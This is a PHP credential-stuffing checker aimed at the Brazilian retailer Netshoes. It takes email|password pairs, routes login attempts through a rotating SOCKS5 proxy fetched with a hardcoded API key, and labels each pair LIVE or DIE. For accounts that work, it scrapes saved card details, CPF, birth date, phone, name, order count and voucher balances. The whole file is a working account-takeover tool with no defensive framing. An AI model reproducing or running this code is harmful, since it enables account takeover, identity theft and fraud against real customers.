<?php

#OBRA DO FATALITY DEIXE OS CREDITOS SEUS FDP#
set_time_limit(0);
set_time_limit(0);
sleep(3);
flush();
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function getProxy(){
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$f = curl_exec($ch);
  $json = json_decode($f);
  $proxy = $json -> ipPort;
  return $proxy;
}
$proxy = getProxy();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netshoes.com.br/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$gett = curl_exec($ch);


$token = getStr($gett,'<input id="clipping" type="hidden" value="','" />');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netshoes.com.br/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password='.$senha.'&recaptchaResponse=&clipping='.$token.'');
$pagamento = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account");
curl_setopt($ch, CURLOPT_POST, 0);
$data = curl_exec($ch);


$pedidos = getStr($data,'<ul class="infos"><li>Você realizou <strong>','</strong>');


curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-cards");
curl_setopt($ch, CURLOPT_POST, 0);
$data1 = curl_exec($ch);

if (strpos($data1, "Você não possui cartões salvos.")) {
    $cartao = "Não Possui"; 
    
} else {
    $cartao = "";
}

$cc = getStr($data1,'<div class="card-list__info-card">','</div>');

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-personal-info");
curl_setopt($ch, CURLOPT_POST, 0);
$data2 = curl_exec($ch);

$cpf = getStr($data2,'name="person[cpf]" value="','"');

$data = getStr($data2,'<span id="date-of-birth" name="person[dateOfBirth]">','</span>');

$telefone = getStr($data2,'name="person[homePhone]" value="','"');




curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-addresses");
curl_setopt($ch, CURLOPT_POST, 0);
$data3 = curl_exec($ch);


$nome = getStr($data3,'<div class="address-user-name"><strong>','</strong></div>');


curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-vouchers");
curl_setopt($ch, CURLOPT_POST, 0);
$data4 = curl_exec($ch);

if (strpos($data4, "Você não possui vales-compra.")) {
    $vales = " Não Possui"; 
  
} else if (strpos($data4, "Aguardando ativação") !== false){
    $vales = " Aguardando Ativação  Saldo:";

} else if (strpos($data4, "Ativo") !== false){
    $vales = " Ativo  Saldo:";

} else {
  $vales = "Não";
}

$saldo = explode('</i>', explode('</i></td><td class="cell green-text"><i>', $data4)[1])[0];





$saldo1 = explode('</i></td><td class="cell">', explode('<td class="cell red-text"><i>R$ 104,90</i></td><td class="cell green-text"><i>', $data4)[1])[0];





if (strpos($data4, "Você não possui vales-compra.")) {
    $validade = ""; 
    
} else if (strpos($data4, "Aguardando ativação") !== false){
    $validade = "";

} else if (strpos($data4, "Ativo") !== false){
    $validade = " Validade: ";

} else {
    $validade= "";
}

$validade = explode('</td><td class="cell">', explode('</i></td><td class="cell">', $data4)[1])[0];

//Fenrir Preto
 if (strpos($pagamento, 'Receba ofertas e descontos exclusivos')) { 
 echo 'LIVE → '.$email.'|'.$senha.' | Nome: '.$nome.' | Data De Nasc: '.$data.' | Pedidos: '.$pedidos.' | Cartão: '.$cc.' '.$cartao.' | CPF: '.$cpf.' | Telefone: '.$telefone.' | Vale Compras: '.$vales.' '.$saldo.' '.$saldo1.' '.$validade.' #FlashReverso';
  }
  else {
 echo 'DIE → '.$email.'|'.$senha.'';

  }
curl_close($ch);
ob_flush();

//echo $data4;
?>